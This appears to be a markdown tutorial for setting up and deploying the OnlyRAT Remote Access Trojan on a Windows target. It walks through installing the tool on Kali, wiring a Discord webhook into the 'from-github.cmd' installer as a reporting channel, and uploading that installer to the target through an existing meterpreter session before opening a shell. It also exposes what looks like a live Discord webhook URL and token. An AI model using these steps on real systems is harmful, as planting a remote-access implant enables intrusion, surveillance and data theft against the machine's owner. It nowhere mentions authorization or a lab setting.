# SETTING UP AND DEPLOYING A RAT

In the current tutorial, we will embark on an engaging endeavor by configuring a Remote Access Trojan (RAT) on a designated server. Specifically, we will employ [OnlyRAT](https://github.com/CosmodiumCS/MK01-OnlyRAT), an all-encompassing software created by **CosmodiumCS** and hosted on GitHub, which assumes the role of a robust instrumentality tailored for the remote management and administration of Windows-based computer systems. 

Once installed, it provides remote administrative access to the targeted system. This access is facilitated through a **Python** console on the attacker's personal computer, allowing for a wide array of operations and payloads to be executed from a remote location.

> A video of how to set this up can be found here: - [Link](https://youtu.be/jMmLx3Cwy2I)

On a **Kali Linux** Machine 

```bash
git clone https://github.com/CosmodiumCS/MK01-OnlyRAT.git ; cd MK01-OnlyRAT/ ; bash install.sh
```
> This will download the repo onto your system then changed directory into it and install it

After the RAT has installed it will delete the install folder. you can run the script by: - 
```bash
onlyrat
```

now to begin we first need to make a discord server, create a text channel in it called OnlyRAT

![[Pasted image 20231114232903.png|300]]

- right click the channel and click **edit channel**

![[Pasted image 20231114233004.png]]

- click the **integration** tab and then click on **Webhooks**

![[Pasted image 20231114233055.png]]
- create a new **Webhook**
- name it onlyRAT
- Copy Webhook URL

```
https://discord.com/api/webhooks/1174129539874570380/5k-zTZdznoGbZVWVMRLgzzbGJjnUXOT8Vok3n9CRwMATCTCBw_IhS3Hb2Dzbu3PtkbSL
```
> Webhook will look something like this. 

go back to the OnlyRAT repo, and click installers, when you are in their download the one that says **from-github.cmd**

open **from-github.cmd** file

![[Pasted image 20231114233946.png]]
> Where is says DISCORDWEBHOOK replace with the Webhook that was created earlier 
>> Save the file

Go back to a meterpreter shell, start one up again if one is no active

To ensure the correct location, employ the **lcd** command to navigate to the directory where the **from-github.cmd** file is situated. For further confirmation, you may also use the **lpwd** command to verify the current directory and the **lls** command to ensure the presence of the desired file within that directory.

> remember to also change the directory where it is uploaded to on the target machien with cd, ls and pwd
>> I like it being in the root dir so C:\

```bash
upload from-github.cmd
```

- after the file has successfully uploaded enter the following 
```bash
shell
```
